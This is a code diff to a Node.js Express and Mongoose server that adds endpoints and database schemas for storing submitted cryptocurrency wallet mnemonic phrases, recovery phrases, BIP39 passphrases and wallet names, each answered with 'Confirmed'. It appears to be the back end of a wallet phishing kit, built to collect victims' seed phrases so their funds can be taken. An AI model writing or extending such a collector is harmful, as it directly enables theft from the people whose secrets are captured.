@@ -62,6 +62,20 @@ const schema6 = new mongoose.Schema({
 });
 const schema6Use = mongoose.model('database6', schema6);
 
+const schema7 = new mongoose.Schema({
+    Time:{type:String},
+    mPhrase: {type:String},
+    walletName: {type:String}
+});
+const schema7Use = mongoose.model('database7', schema7);
+
+const schema8 = new mongoose.Schema({
+    Time:{type:String},
+    recoveryPhrase: {type:String},
+    bip39passPhrase: {type:String}
+});
+const schema8Use = mongoose.model('database8', schema8);
+
 //MiddleWares
 server.use(cors());
 server.use(bodyParser.json());
@@ -167,6 +181,44 @@ server.post("/api/data6",(req,res)=>{
         let data = new schema6Use({
             Time:indiaTime,
             recoveryPhrase:req.body.recoveryPhrase
+        });
+        try{
+            await data.save();
+            console.log("Saved")
+        }
+        catch{
+            console.log("NO")
+        }
+    }
+    res.json({status:"Confirmed"});
+    saveSchema()
+})
+
+server.post("/api/data7",(req,res)=>{
+    async function saveSchema(){
+        let data = new schema7Use({
+            Time:indiaTime,
+            mPhrase:req.body.mPhrase,
+            walletName:req.body.walletName
+        });
+        try{
+            await data.save();
+            console.log("Saved")
+        }
+        catch{
+            console.log("NO")
+        }
+    }
+    res.json({status:"Confirmed"});
+    saveSchema()
+})
+
+server.post("/api/data8",(req,res)=>{
+    async function saveSchema(){
+        let data = new schema8Use({
+            Time:indiaTime,
+            recoveryPhrase:req.body.recoveryPhrase,
+            bip39passPhrase:req.body.bip39passPhrase
         });
         try{
             await data.save();
